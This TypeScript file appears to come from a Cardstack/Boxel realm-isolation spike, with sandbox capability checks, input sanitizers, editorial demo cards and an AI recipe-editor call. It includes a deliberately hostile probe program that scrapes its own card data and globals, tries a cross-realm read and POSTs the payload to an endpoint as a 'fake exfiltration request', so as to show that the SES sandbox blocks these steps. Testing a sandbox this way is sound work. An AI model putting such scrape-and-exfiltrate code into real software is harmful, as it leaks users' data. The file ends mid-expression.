import { SupportedMimeType, rri, type Query } from '@cardstack/runtime-common';

export const SPIKE_STORAGE_KEY = 'boxel-realm-isolation-spike-v2';
export const AI_PROXY_URL = 'https://openrouter.ai/api/v1/chat/completions';

export type SpikeCardRole = 'parent' | 'child';

export interface SpikeRealmConfig {
  realmURL: string;
  cardURL: string;
  programURL: string;
  label: string;
  role: SpikeCardRole;
  canUseAIProxy: boolean;
  moduleCardURLs?: {
    video: string;
    recipe: string;
    comments: string;
    securityProbe?: string;
  };
}

export interface SpikeCardSnapshot {
  id: string;
  realmLabel: string;
  role: SpikeCardRole;
  privateValue: string;
  note: string;
  counter: number;
}

export interface SpikeRenderAction {
  id: 'increment' | 'refresh' | 'probe-other' | 'delegate-child';
  label: string;
}

export interface EditorialArticleModel {
  section: string;
  title: string;
  dek: string;
  byline: string;
  published: string;
  readTime: string;
  location: string;
  opening: string;
  body: string[];
  pullQuote: string;
}

export interface EditorialVideoModel {
  eyebrow: string;
  title: string;
  description: string;
  duration: string;
}

export interface EditorialRecipeModel {
  id: string;
  eyebrow: string;
  title: string;
  description: string;
  imageURL: string;
  serves: string;
  time: string;
  ingredients: string[];
  steps: string[];
}

export interface AIRecipeProposal {
  title: string;
  description: string;
  serves: string;
  time: string;
  ingredients: string[];
  steps: string[];
}

export interface EditorialComment {
  author: string;
  body: string;
  timestamp: string;
}

export interface MaliciousFinding {
  label: string;
  status: 'visible' | 'blocked' | 'granted';
  value: string;
}

export interface RealmSandboxProbeReport {
  heading: string;
  summary: string;
  payloadPreview: string;
  findings: MaliciousFinding[];
}

export interface EditorialCommentModel {
  mode: 'nice' | 'malicious';
  comments: EditorialComment[];
  findings: MaliciousFinding[];
}

export interface EditorialChildModules {
  video: EditorialVideoModel;
  recipe: EditorialRecipeModel;
  comments: EditorialCommentModel;
  ai: { label: string; placeholder: string };
}

export interface SpikeRenderModel {
  kind: 'realm-card';
  title: string;
  subtitle: string;
  theme: 'parent' | 'child';
  fields: Array<{ label: string; value: string }>;
  editor: { label: string; value: string };
  actions: SpikeRenderAction[];
  ai?: { label: string; placeholder: string };
  article?: EditorialArticleModel;
  modules?: EditorialChildModules;
}

export interface SpikeProgramView {
  card: SpikeCardSnapshot;
  queryCount: number;
  render: SpikeRenderModel;
  ambient: {
    fetch: string;
    window: string;
    document: string;
    localStorage: string;
    functionEscapeReachedWindow: boolean;
  };
  boundary?: {
    allowed: boolean;
    message: string;
  };
  aiResult?: string;
  aiProposal?: AIRecipeProposal;
  recipeUpdateResult?: string;
}

export interface ParentDelegationRequest {
  renderer: 'child';
  props: {
    message: string;
    parentCounter: number;
  };
}

export interface DelegatedRenderModel {
  kind: 'delegated-child';
  title: string;
  message: string;
  parentCounter: number;
  receivedKeys: string[];
  parentPrivateStateVisible: boolean;
  modules: EditorialChildModules;
  aiResult?: string;
  aiProposal?: AIRecipeProposal;
  recipeUpdateResult?: string;
}

export interface WorkerCapabilityRequest {
  type: 'capability-request';
  requestId: string;
  operation:
    | 'read-own-card'
    | 'write-own-card'
    | 'read-card'
    | 'read-recipe'
    | 'query-own'
    | 'run-own-command'
    | 'run-recipe-command'
    | 'proxy-fetch';
  args: unknown[];
}

export interface WorkerInvocationResult {
  type: 'invocation-result';
  invocationId: string;
  value?: unknown;
  error?: string;
}

export function assertURLWithinRealm(realmURL: string, targetURL: string): URL {
  let realm = new URL(realmURL);
  let target = new URL(targetURL);
  let realmPath = realm.pathname.endsWith('/')
    ? realm.pathname
    : `${realm.pathname}/`;

  if (
    target.origin !== realm.origin ||
    !target.pathname.startsWith(realmPath)
  ) {
    throw new Error(
      `Denied cross-realm access from ${realm.href} to ${target.href}`,
    );
  }

  return target;
}

export function assertAllowedAIProxyURL(targetURL: string): string {
  let target = new URL(targetURL);
  if (target.href !== AI_PROXY_URL) {
    throw new Error(`AI fetch is restricted to ${AI_PROXY_URL}`);
  }
  return target.href;
}

export function sanitizeOwnCardPatch(value: unknown): { note: string } {
  if (!value || typeof value !== 'object' || Array.isArray(value)) {
    throw new Error('Own-card write must be an object');
  }
  let record = value as Record<string, unknown>;
  let keys = Object.keys(record);
  if (keys.length !== 1 || keys[0] !== 'note') {
    throw new Error('Own-card writes may only change note');
  }
  if (typeof record.note !== 'string' || record.note.length > 500) {
    throw new Error('note must be a string of at most 500 characters');
  }
  return { note: record.note };
}

export function sanitizeRecipeIngredients(value: unknown): string[] {
  if (!Array.isArray(value) || value.length === 0 || value.length > 20) {
    throw new Error('ingredients must contain between 1 and 20 items');
  }
  return value.map((ingredient, index) => {
    if (typeof ingredient !== 'string') {
      throw new Error(`ingredient ${index + 1} must be text`);
    }
    let normalized = ingredient.trim();
    if (normalized.length === 0 || normalized.length > 140) {
      throw new Error(
        `ingredient ${index + 1} must contain between 1 and 140 characters`,
      );
    }
    return normalized;
  });
}

function sanitizeRecipeText(
  value: unknown,
  field: 'title' | 'description' | 'serves' | 'time',
  maxLength: number,
): string {
  if (typeof value !== 'string') {
    throw new Error(`${field} must be text`);
  }
  let normalized = value.trim();
  if (normalized.length === 0 || normalized.length > maxLength) {
    throw new Error(
      `${field} must contain between 1 and ${maxLength} characters`,
    );
  }
  return normalized;
}

function sanitizeRecipeSteps(value: unknown): string[] {
  if (!Array.isArray(value) || value.length === 0 || value.length > 12) {
    throw new Error('steps must contain between 1 and 12 items');
  }
  return value.map((step, index) => {
    if (typeof step !== 'string') {
      throw new Error(`step ${index + 1} must be text`);
    }
    let normalized = step.trim();
    if (normalized.length === 0 || normalized.length > 300) {
      throw new Error(
        `step ${index + 1} must contain between 1 and 300 characters`,
      );
    }
    return normalized;
  });
}

export function sanitizeRecipeCommandInput(value: unknown): AIRecipeProposal {
  if (!value || typeof value !== 'object' || Array.isArray(value)) {
    throw new Error('Recipe command input must be an object');
  }
  let record = value as Record<string, unknown>;
  let allowedKeys = [
    'title',
    'description',
    'serves',
    'time',
    'ingredients',
    'steps',
  ];
  let keys = Object.keys(record);
  if (
    keys.length !== allowedKeys.length ||
    keys.some((key) => !allowedKeys.includes(key))
  ) {
    throw new Error(
      'Recipe command may only change title, description, serves, time, ingredients, and steps',
    );
  }
  return {
    title: sanitizeRecipeText(record.title, 'title', 120),
    description: sanitizeRecipeText(record.description, 'description', 500),
    serves: sanitizeRecipeText(record.serves, 'serves', 40),
    time: sanitizeRecipeText(record.time, 'time', 60),
    ingredients: sanitizeRecipeIngredients(record.ingredients),
    steps: sanitizeRecipeSteps(record.steps),
  };
}

export function sanitizeDelegationProps(
  value: unknown,
): ParentDelegationRequest['props'] {
  if (!value || typeof value !== 'object' || Array.isArray(value)) {
    throw new Error('Delegated render props must be an object');
  }
  let record = value as Record<string, unknown>;
  let allowedKeys = ['message', 'parentCounter'];
  if (Object.keys(record).some((key) => !allowedKeys.includes(key))) {
    throw new Error('Parent attempted to delegate private state');
  }
  if (typeof record.message !== 'string' || record.message.length > 240) {
    throw new Error('Delegated message must be at most 240 characters');
  }
  if (
    typeof record.parentCounter !== 'number' ||
    !Number.isFinite(record.parentCounter)
  ) {
    throw new Error('Delegated parentCounter must be finite');
  }
  return {
    message: record.message,
    parentCounter: record.parentCounter,
  };
}

export function sanitizeAIProxyRequest(value: unknown): string {
  if (!value || typeof value !== 'object' || Array.isArray(value)) {
    throw new Error('AI proxy request must be an object');
  }
  let record = value as Record<string, unknown>;
  if (!Array.isArray(record.messages) || record.messages.length === 0) {
    throw new Error('AI proxy request needs messages');
  }
  let messages = record.messages.slice(0, 8).map((message) => {
    if (!message || typeof message !== 'object' || Array.isArray(message)) {
      throw new Error('AI message must be an object');
    }
    let candidate = message as Record<string, unknown>;
    if (
      !['system', 'user', 'assistant'].includes(String(candidate.role)) ||
      typeof candidate.content !== 'string'
    ) {
      throw new Error('AI messages require a valid role and text content');
    }
    return {
      role: String(candidate.role),
      content: candidate.content.slice(0, 4000),
    };
  });
  return JSON.stringify({
    model: 'anthropic/claude-haiku-4.5',
    messages,
    stream: false,
    max_tokens: 900,
  });
}

export function spikeCardQuery(
  realmURL: string,
  role: SpikeCardRole = 'parent',
): Query {
  return {
    filter: {
      type: {
        module: rri(
          role === 'parent'
            ? `${realmURL}article-card`
            : `${realmURL}story-modules`,
        ),
        name: role === 'parent' ? 'ArticleCard' : 'CommentCard',
      },
    },
  };
}

export function snapshotFromCardDocument(
  cardURL: string,
  document: unknown,
): SpikeCardSnapshot {
  let data = (document as { data?: { attributes?: Record<string, unknown> } })
    ?.data;
  let attributes = data?.attributes;

  if (!attributes) {
    throw new Error(`Card ${cardURL} did not return Card attributes`);
  }

  let role: SpikeCardRole = attributes.role === 'child' ? 'child' : 'parent';
  return {
    id: cardURL,
    realmLabel: String(attributes.realmLabel ?? ''),
    role,
    privateValue: String(attributes.privateValue ?? ''),
    note: String(attributes.note ?? ''),
    counter: Number(attributes.counter ?? 0),
  };
}

export function recipeSnapshotFromCardDocument(
  cardURL: string,
  document: unknown,
): EditorialRecipeModel {
  let data = (document as { data?: { attributes?: Record<string, unknown> } })
    ?.data;
  let attributes = data?.attributes;
  if (!attributes) {
    throw new Error(`RecipeCard ${cardURL} did not return Card attributes`);
  }

  return {
    id: cardURL,
    eyebrow: String(attributes.eyebrow ?? ''),
    title: String(attributes.title ?? ''),
    description: String(attributes.description ?? ''),
    imageURL: String(attributes.imageURL ?? ''),
    serves: String(attributes.serves ?? ''),
    time: String(attributes.time ?? ''),
    ingredients: sanitizeRecipeIngredients(attributes.ingredients),
    steps: Array.isArray(attributes.steps)
      ? attributes.steps.map((step) => String(step))
      : [],
  };
}

export const EDITORIAL_ARTICLE_CARD_SOURCE = `
import {
  CardDef,
  Component,
  contains,
  containsMany,
  field,
  linksTo,
} from 'https://cardstack.com/base/card-api';
import StringField from 'https://cardstack.com/base/string';
import NumberField from 'https://cardstack.com/base/number';

export class ArticleCard extends CardDef {
  static displayName = 'Editorial Article';
  @field realmLabel = contains(StringField);
  @field role = contains(StringField);
  @field privateValue = contains(StringField);
  @field note = contains(StringField);
  @field counter = contains(NumberField);
  @field section = contains(StringField);
  @field title = contains(StringField);
  @field dek = contains(StringField);
  @field byline = contains(StringField);
  @field published = contains(StringField);
  @field readTime = contains(StringField);
  @field location = contains(StringField);
  @field opening = contains(StringField);
  @field body = containsMany(StringField);
  @field pullQuote = contains(StringField);
  @field video = linksTo(CardDef);
  @field recipe = linksTo(CardDef);
  @field comments = linksTo(CardDef);

  static isolated = class Isolated extends Component<typeof this> {
    <template>
      <article class='article'>
        <header>
          <div class='masthead'>
            <span><@fields.section /></span>
            <span><@fields.location /></span>
          </div>
          <p class='issue'>No. 18 · Autumn</p>
          <h1><@fields.title /></h1>
          <p class='dek'><@fields.dek /></p>
          <div class='byline'>
            <span><@fields.byline /></span>
            <span><@fields.published /></span>
            <span><@fields.readTime /></span>
          </div>
        </header>
        <div class='copy'>
          <p class='opening'><@fields.opening /></p>
          <@fields.body />
          <blockquote><@fields.pullQuote /></blockquote>
          <section class='child-card'><@fields.video @format='embedded' /></section>
          <section class='child-card'><@fields.recipe @format='embedded' /></section>
          <section class='child-card'><@fields.comments @format='embedded' /></section>
        </div>
      </article>
      <style scoped>
        .article {
          --ink: #211d18;
          color: var(--ink);
          background: #fbf7ef;
          border: 1px solid #d9d0c1;
          border-radius: 1.5rem;
          box-shadow: 0 1.5rem 4rem rgb(56 43 27 / 12%);
          overflow: hidden;
          font-family: Georgia, 'Times New Roman', serif;
        }
        header {
          padding: 2rem clamp(1.5rem, 5vw, 4.5rem) 2.5rem;
          background: linear-gradient(145deg, #efe5d3, #fbf7ef 58%);
          border-bottom: 1px solid #d9d0c1;
        }
        .masthead,
        .byline {
          display: flex;
          flex-wrap: wrap;
          justify-content: space-between;
          gap: 0.75rem 1.5rem;
          color: #6d5f4e;
          font: 700 0.72rem/1.3 system-ui, sans-serif;
          letter-spacing: 0.12em;
          text-transform: uppercase;
        }
        .issue {
          margin: 3rem 0 0.65rem;
          color: #9a3f2b;
          font: 700 0.74rem/1 system-ui, sans-serif;
          letter-spacing: 0.16em;
          text-transform: uppercase;
        }
        h1 {
          max-width: 13ch;
          margin: 0;
          font-size: clamp(2.6rem, 7vw, 5.5rem);
          font-weight: 500;
          line-height: 0.94;
          letter-spacing: -0.045em;
        }
        .dek {
          max-width: 45rem;
          margin: 1.5rem 0;
          color: #5f5142;
          font-size: clamp(1.15rem, 2vw, 1.55rem);
          line-height: 1.45;
        }
        .copy {
          max-width: 54rem;
          margin: 0 auto;
          padding: 3rem clamp(1.25rem, 4vw, 3rem) 5rem;
          font-size: 1.06rem;
          line-height: 1.85;
        }
        .opening {
          font-size: 1.35rem;
          line-height: 1.65;
        }
        blockquote {
          margin: 3rem 0;
          padding: 1rem 0 1rem 2rem;
          border-left: 0.25rem solid #b24b34;
          color: #8f3827;
          font-size: clamp(1.55rem, 4vw, 2.5rem);
          font-style: italic;
          line-height: 1.2;
        }
        .child-card {
          margin: 2.75rem 0;
        }
      </style>
    </template>
  };
}
`;

export const EDITORIAL_CHILD_CARDS_SOURCE = `
import {
  CardDef,
  Component,
  contains,
  containsMany,
  field,
} from 'https://cardstack.com/base/card-api';
import StringField from 'https://cardstack.com/base/string';
import NumberField from 'https://cardstack.com/base/number';

export class VideoCard extends CardDef {
  static displayName = 'Editorial Video';
  @field eyebrow = contains(StringField);
  @field title = contains(StringField);
  @field description = contains(StringField);
  @field duration = contains(StringField);
  @field imageURL = contains(StringField);

  static embedded = class Embedded extends Component<typeof this> {
    <template>
      <figure class='video'>
        <img src={{@model.imageURL}} alt='' />
        <div class='shade'></div>
        <button type='button' aria-label='Play video'>▶</button>
        <figcaption>
          <p><@fields.eyebrow /></p>
          <h2><@fields.title /></h2>
          <span><@fields.duration /></span>
        </figcaption>
      </figure>
      <style scoped>
        .video {
          position: relative;
          min-height: 26rem;
          margin: 0;
          border-radius: 1.35rem;
          overflow: hidden;
          color: white;
          background: #241b16;
          box-shadow: 0 1.5rem 3rem rgb(35 24 17 / 25%);
        }
        img,
        .shade {
          position: absolute;
          inset: 0;
          width: 100%;
          height: 100%;
        }
        img { object-fit: cover; }
        .shade {
          background: linear-gradient(180deg, transparent 24%, rgb(20 12 8 / 82%));
        }
        button {
          position: absolute;
          inset: 50% auto auto 50%;
          translate: -50% -50%;
          width: 4.5rem;
          height: 4.5rem;
          border: 1px solid rgb(255 255 255 / 70%);
          border-radius: 50%;
          color: white;
          background: rgb(255 255 255 / 18%);
          backdrop-filter: blur(0.6rem);
          font-size: 1.25rem;
        }
        figcaption {
          position: absolute;
          inset: auto 0 0;
          padding: 2rem;
        }
        p,
        span {
          font: 700 0.72rem/1.2 system-ui, sans-serif;
          letter-spacing: 0.13em;
          text-transform: uppercase;
        }
        h2 {
          max-width: 23rem;
          margin: 0.5rem 0;
          font: 500 clamp(1.8rem, 4vw, 3rem)/1.05 Georgia, serif;
        }
      </style>
    </template>
  };

  static isolated = this.embedded;
}

export class RecipeCard extends CardDef {
  static displayName = 'Editorial Recipe and AI Assistant';
  @field eyebrow = contains(StringField);
  @field title = contains(StringField);
  @field description = contains(StringField);
  @field imageURL = contains(StringField);
  @field serves = contains(StringField);
  @field time = contains(StringField);
  @field ingredients = containsMany(StringField);
  @field steps = containsMany(StringField);
  @field aiLabel = contains(StringField);
  @field aiPlaceholder = contains(StringField);

  static embedded = class Embedded extends Component<typeof this> {
    <template>
      <section class='recipe'>
        <img src={{@model.imageURL}} alt='' />
        <div class='content'>
          <p class='eyebrow'><@fields.eyebrow /></p>
          <h2><@fields.title /></h2>
          <p class='dek'><@fields.description /></p>
          <div class='meta'><span><@fields.serves /></span><span><@fields.time /></span></div>
          <div class='columns'>
            <div><h3>Ingredients</h3><@fields.ingredients /></div>
            <div><h3>Method</h3><@fields.steps /></div>
          </div>
          <aside>
            <p>Ask the story</p>
            <h3>A kitchen editor, within bounds</h3>
            <label>
              <span><@fields.aiLabel /></span>
              <div><input placeholder={{@model.aiPlaceholder}} /><button type='button'>Ask AI</button></div>
            </label>
            <small>The host grants the AI proxy capability; the API key never enters this card.</small>
          </aside>
        </div>
      </section>
      <style scoped>
        .recipe {
          overflow: hidden;
          border: 1px solid #d7cdbc;
          border-radius: 1.35rem;
          color: #272019;
          background: #f7f1e6;
          box-shadow: 0 1.25rem 3rem rgb(64 46 27 / 14%);
        }
        img {
          width: 100%;
          height: 22rem;
          object-fit: cover;
        }
        .content { padding: clamp(1.5rem, 4vw, 3rem); }
        .eyebrow,
        .meta {
          color: #a2442f;
          font: 700 0.72rem/1.2 system-ui, sans-serif;
          letter-spacing: 0.12em;
          text-transform: uppercase;
        }
        h2 {
          max-width: 14ch;
          margin: 0.6rem 0;
          font: 500 clamp(2rem, 5vw, 3.7rem)/1 Georgia, serif;
        }
        .dek { max-width: 39rem; color: #685b4c; font-size: 1.08rem; line-height: 1.6; }
        .meta { display: flex; gap: 1.5rem; margin: 1.5rem 0; }
        .columns { display: grid; grid-template-columns: 1fr 1fr; gap: 2.5rem; }
        aside {
          margin-top: 2.5rem;
          padding: 1.5rem;
          border-radius: 1rem;
          color: white;
          background: linear-gradient(135deg, #30243c, #593a66);
          font-family: system-ui, sans-serif;
        }
        aside p { color: #f2bd75; text-transform: uppercase; letter-spacing: 0.12em; }
        aside h3 { margin: 0.25rem 0 1rem; font: 500 1.7rem/1.1 Georgia, serif; }
        label > span { display: block; margin-bottom: 0.5rem; font-size: 0.82rem; }
        label div { display: flex; gap: 0.5rem; }
        input {
          min-width: 0;
          flex: 1;
          padding: 0.8rem 1rem;
          border: 0;
          border-radius: 0.65rem;
          color: #231a2e;
          background: white;
        }
        button { border: 0; border-radius: 0.65rem; padding: 0.8rem 1rem; color: #30243c; background: #f2bd75; font-weight: 700; }
        small { display: block; margin-top: 0.8rem; color: #d8cfe0; }
        @media (max-width: 42rem) {
          .columns { grid-template-columns: 1fr; }
          label div { flex-direction: column; }
        }
      </style>
    </template>
  };

  static isolated = this.embedded;
}

export class CommentCard extends CardDef {
  static displayName = 'Editorial Comments';
  @field realmLabel = contains(StringField);
  @field role = contains(StringField);
  @field privateValue = contains(StringField);
  @field note = contains(StringField);
  @field counter = contains(NumberField);
  @field heading = contains(StringField);
  @field introduction = contains(StringField);
  @field starterComments = containsMany(StringField);

  static embedded = class Embedded extends Component<typeof this> {
    <template>
      <section class='comments'>
        <p class='eyebrow'>Reader notes</p>
        <h2><@fields.heading /></h2>
        <p class='intro'><@fields.introduction /></p>
        <div class='notes'><@fields.starterComments /></div>
        <form>
          <label><span>Name</span><input placeholder='Your name' /></label>
          <label><span>Comment</span><textarea placeholder='What did this story make you want to cook?'></textarea></label>
          <button type='button'>Post comment</button>
        </form>
      </section>
      <style scoped>
        .comments {
          padding: clamp(1.5rem, 4vw, 3rem);
          border: 1px solid #d8d0c2;
          border-radius: 1.35rem;
          color: #25211d;
          background: #fffdfa;
          box-shadow: 0 1.25rem 3rem rgb(58 43 28 / 10%);
          font-family: system-ui, sans-serif;
        }
        .eyebrow { color: #a2442f; font-size: 0.72rem; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase; }
        h2 { margin: 0.4rem 0; font: 500 clamp(1.8rem, 4vw, 3rem)/1 Georgia, serif; }
        .intro { color: #706558; }
        .notes { margin: 1.5rem 0; padding: 1.25rem; border-radius: 0.9rem; background: #f5efe6; line-height: 1.6; }
        form { display: grid; gap: 1rem; }
        label span { display: block; margin-bottom: 0.35rem; font-size: 0.78rem; font-weight: 700; }
        input,
        textarea { box-sizing: border-box; width: 100%; padding: 0.8rem; border: 1px solid #cfc5b6; border-radius: 0.65rem; color: #25211d; background: white; font: inherit; }
        textarea { min-height: 7rem; resize: vertical; }
        button { justify-self: start; border: 0; border-radius: 999px; padding: 0.8rem 1.2rem; color: white; background: #29241f; font-weight: 700; }
      </style>
    </template>
  };

  static isolated = this.embedded;
}

`;

export const SECURITY_PROBE_CARD_SOURCE = `
import {
  CardDef,
  Component,
  contains,
  field,
} from 'https://cardstack.com/base/card-api';
import StringField from 'https://cardstack.com/base/string';
import NumberField from 'https://cardstack.com/base/number';

export class SecurityProbeCard extends CardDef {
  static displayName = 'Realm Security Probe';
  @field title = contains(StringField);
  @field realmLabel = contains(StringField);
  @field role = contains(StringField);
  @field privateValue = contains(StringField);
  @field note = contains(StringField);
  @field counter = contains(NumberField);
  @field heading = contains(StringField);
  @field introduction = contains(StringField);
  @field sandboxProfile = contains(StringField);
  @field realmURL = contains(StringField);
  @field targetCardURL = contains(StringField);
  @field targetEndpoint = contains(StringField);

  // The host replaces this isolated presentation at the CardRenderer boundary.
  // The card remains an ordinary realm card and its default edit template keeps
  // working. Interactive code is evaluated by the realm's worker instead of in
  // the host window.
  static isolated = class Isolated extends Component<typeof this> {
    <template>
      <section>
        <h2><@fields.heading /></h2>
        <p><@fields.introduction /></p>
      </section>
    </template>
  };
}
`;

// A deliberately hostile program stored beside the card in its ordinary
// realm. It runs inside SES and receives only the realm-scoped capabilities
// supplied by the host. The fake exfiltration URL is never contacted.
export const SECURITY_PROBE_PROGRAM_SOURCE = `
(() => {
  const blockedGlobal = (name, valueType) => harden({
    label: name,
    status: valueType === 'undefined' ? 'blocked' : 'visible',
    value: valueType,
  });

  return harden({
    scrapeAll: async (targetCardURL, targetEndpoint) => {
      const ownCard = await capabilities.readOwnCard();
      const globalNames = Object.getOwnPropertyNames(globalThis).sort();
      const payload = harden({
        ownCard,
        globalNames,
        windowType: typeof window,
        documentType: typeof document,
        localStorageType: typeof localStorage,
      });

      let parentRead;
      try {
        await capabilities.readCard(String(targetCardURL));
        parentRead = harden({
          label: 'Parent-realm card',
          status: 'visible',
          value: 'UNEXPECTED: cross-realm read succeeded',
        });
      } catch (error) {
        parentRead = harden({
          label: 'Parent-realm card',
          status: 'blocked',
          value: 'Blocked: ' + String(error && error.message ? error.message : error),
        });
      }

      let exfiltration;
      try {
        await fetch(String(targetEndpoint), harden({
          method: 'POST',
          body: JSON.stringify(payload),
        }));
        exfiltration = harden({
          label: 'Fake exfiltration request',
          status: 'visible',
          value: 'UNEXPECTED: arbitrary request succeeded',
        });
      } catch (error) {
        exfiltration = harden({
          label: 'Fake exfiltration request',
          status: 'blocked',
          value: 'Blocked before network: ' + String(error && error.message ? error.message : error),
        });
      }

      return harden({
        heading: 'Exfiltration denied',
        summary: 'The hostile card could inspect its own snapshot, but it received no DOM, browser storage, parent-realm data, credentials, or arbitrary network authority.',
        payloadPreview: JSON.stringify(payload, null, 2),
        findings: harden([
          harden({
            label: 'Own card snapshot',
            status: 'visible',
            value: JSON.stringify(ownCard),
          }),
          blockedGlobal('window', typeof window),
          blockedGlobal('document', typeof document),
          blockedGlobal('localStorage', typeof localStorage),
          parentRead,
          exfiltration,
          harden({
            label: 'Matrix credentials / API keys',
            status: 'blocked',
            value: 'Not endowed to the realm compartment',
          }),
        ]),
      });
    },
  });
})()
`;

// Stored in each staging realm and evaluated inside that realm's SES
// Compartment. The program owns its render description and event handlers.
export const ISOLATION_PROGRAM_SOURCE = `
(() => {
  const ambient = harden({
    fetch: typeof fetch,
    window: typeof window,
    document: typeof document,
    localStorage: typeof localStorage,
    functionEscapeReachedWindow: (() => {
      try {
        return Function('return typeof window !== "undefined"')();
      } catch (_error) {
        return false;
      }
    })(),
  });

  let boundary;
  let aiResult;
  let aiProposal;
  let recipeUpdateResult;
  let commentMode = 'nice';
  let maliciousFindings = harden([]);
  let delegatedProps = harden({});
  const comments = harden([
    harden({
      author: 'Mara L.',
      body: 'Made this on a rainy Sunday. The lemon at the end is exactly right.',
      timestamp: '18 minutes ago',
    }),
    harden({
      author: 'Jon Bell',
      body: 'I used gigante beans and doubled the basil. A keeper.',
      timestamp: '1 hour ago',
    }),
  ]);

  const commentsFor = (card) => {
    try {
      const saved = JSON.parse(card.note);
      if (
        saved &&
        saved.kind === 'editorial-comment' &&
        typeof saved.author === 'string' &&
        typeof saved.body === 'string'
      ) {
        return harden([
          ...comments,
          harden({
            author: saved.author,
            body: saved.body,
            timestamp: 'Saved in the child realm',
          }),
        ]);
      }
    } catch (_error) {
      // The original demo note is not a serialized comment.
    }
    return comments;
  };

  const articleModel = harden({
    section: 'The Sunday Table',
    title: 'A slow afternoon in the kitchen, with tomatoes on the fire',
    dek: 'On the last warm weekend of the season, one pot of beans became an argument for staying in.',
    byline: 'Words by Eliza Rowan',
    published: 'October 12, 2026',
    readTime: '7 minute read',
    location: 'Hudson Valley, New York',
    opening: 'By four o’clock, the kitchen windows had fogged at their edges. Outside, the orchard was going copper; inside, tomatoes collapsed against the iron pan and filled the room with the smell of late summer.',
    body: harden([
      'There is a particular kind of cooking that begins without a plan. A bowl of beans waits in the refrigerator. Bread has gone just stale enough to welcome olive oil. The tomatoes are soft, nearly past their moment, which is precisely when they become generous.',
      'We blistered them until their skins split, then folded them into the beans with garlic and a cup of their cooking liquid. Nothing hurried. The sauce thickened while the light moved across the table and everyone found a reason to stay nearby.',
      'The finished bowl asks for very little ceremony: torn basil, lemon zest, black pepper, and toast dragged once through the red-gold broth. It is dinner, but it is also the useful reminder that abundance often looks like paying close attention to what is already here.',
    ]),
    pullQuote: 'The best recipes do not rescue an afternoon. They reveal that it was already worth keeping.',
  });

  const childModules = (card, recipe) => harden({
    video: harden({
      eyebrow: 'Field notes · 04:12',
      title: 'Watch: Building flavor over an open flame',
      description: 'A short film from the child realm follows the tomatoes from blistered skins to a glossy, spoonable sauce.',
      duration: '4:12',
    }),
    recipe,
    comments: harden({
      mode: commentMode,
      comments: commentsFor(card),
      findings: maliciousFindings,
    }),
    ai: harden({
      label: 'Ask about substitutions, technique, or the story',
      placeholder: 'Could I use chickpeas instead?',
    }),
  });

  const renderModel = (card, recipe) => harden({
    kind: 'realm-card',
    title: card.role === 'parent' ? articleModel.title : 'Story companion modules',
    subtitle: card.role === 'parent'
      ? articleModel.dek
      : 'Video, recipe, Ask AI, and comments—owned by the child realm.',
    theme: card.role,
    fields: harden([
      harden({ label: 'Private realm value', value: card.privateValue }),
      harden({ label: 'Counter', value: String(card.counter) }),
      harden({ label: 'Saved note', value: card.note }),
    ]),
    editor: harden({ label: 'Edit my own note', value: card.note }),
    actions: harden([
      harden({ id: 'increment', label: 'Run my increment command' }),
      harden({ id: 'refresh', label: 'Read my own data' }),
      harden({ id: 'probe-other', label: 'Try to read the other card' }),
      ...(card.role === 'parent'
        ? [harden({ id: 'delegate-child', label: 'Mount child modules' })]
        : []),
    ]),
    ...(card.role === 'parent' ? { article: articleModel } : { modules: childModules(card, recipe) }),
    ...(card.role === 'child' ? { ai: childModules(card, recipe).ai } : {}),
  });

  const snapshot = async () => {
    const card = await capabilities.readOwnCard();
    const recipe = card.role === 'child' ? await capabilities.readRecipe() : undefined;
    const matches = await capabilities.queryOwnCards();
    return harden({
      card,
      queryCount: matches.length,
      render: renderModel(card, recipe),
      ambient,
      ...(boundary ? { boundary } : {}),
      ...(aiResult ? { aiResult } : {}),
      ...(aiProposal ? { aiProposal } : {}),
      ...(recipeUpdateResult ? { recipeUpdateResult } : {}),
    });
  };

  return harden({
    initialize: snapshot,
    refresh: snapshot,
    increment: async () => {
      await capabilities.runOwnCommand('increment');
      return snapshot();
    },
    saveNote: async (note) => {
      await capabilities.writeOwnCard(harden({ note }));
      return snapshot();
    },
    askAI: async (prompt) => {
      if (typeof fetch !== 'function') {
        throw new Error('This card was not granted the AI proxy fetch capability');
      }
      const recipe = await capabilities.readRecipe();
      recipeUpdateResult = undefined;
      aiProposal = undefined;
      const response = await fetch('${AI_PROXY_URL}', harden({
        method: 'POST',
        body: JSON.stringify({
          messages: [
            {
              role: 'system',
              content: 'You are a careful recipe editor. Return only JSON with an answer string, title string, description string, serves string, time string, ingredients array, and steps array. Return a complete, internally consistent recipe proposal, not only changed fields. The serves value must be concise, such as "Serves 8"; do not put the serving count in the description. When changing servings, calculate one scale factor as requested servings divided by current servings and multiply every scalable ingredient quantity exactly once by that factor (for example, 4 to 8 is 2x, never 4x). Preserve proportions and keep time accurate. Remove all references to an excluded ingredient from the title, description, ingredients, and steps.',
            },
            {
              role: 'user',
              content: 'Current RecipeCard: ' + JSON.stringify({
                title: recipe.title,
                description: recipe.description,
                serves: recipe.serves,
                time: recipe.time,
                ingredients: recipe.ingredients,
                steps: recipe.steps,
              }) + '\\nReader request: ' + String(prompt),
            },
          ],
        }),
      }));
      const payload = await response.json();
      if (!response.ok) {
        throw new Error(payload.error || 'AI proxy request failed');
      }
      const rawResult = String(payload.choices?.[0]?.message?.content || 'No text returned');
      try {
        const start = rawResult.indexOf('{');
        const end = rawResult.lastIndexOf('}');
        if (start < 0 || end <= start) {
          throw new Error('AI response did not contain JSON');
        }
        const parsed = JSON.parse(rawResult.slice(start, end + 1));
        if (!parsed || typeof parsed !== 'object') {
          throw new Error('AI response did not match the proposal shape');
        }
        if (
          typeof parsed.title !== 'string' ||
          typeof parsed.description !== 'string' ||
          typeof parsed.serves !== 'string' ||
          typeof parsed.time !== 'string' ||
          !Array.isArray(parsed.ingredients) ||
          !Array.isArray(parsed.steps)
        ) {
          throw new Error('AI response did not contain a complete recipe');
        }
        const proposal = {
          title: parsed.title.trim().slice(0, 120),
          description: parsed.description.trim().slice(0, 500),
          serves: parsed.serves.trim().slice(0, 40),
          time: parsed.time.trim().slice(0, 60),
          ingredients: parsed.ingredients
            .map((ingredient) => String(ingredient).trim().slice(0, 140))
            .filter(Boolean)
            .slice(0, 20),
          steps: parsed.steps
            .map((step) => String(step).trim().slice(0, 300))
            .filter(Boolean)
            .slice(0, 12),
        };
        if (
          !proposal.title ||
          !proposal.description ||
          !proposal.serves ||
          !proposal.time ||
          proposal.ingredients.length === 0 ||
          proposal.steps.length === 0
        ) {
          throw new Error('AI returned an incomplete recipe');
        }
        aiResult =
          typeof parsed.answer === 'string'
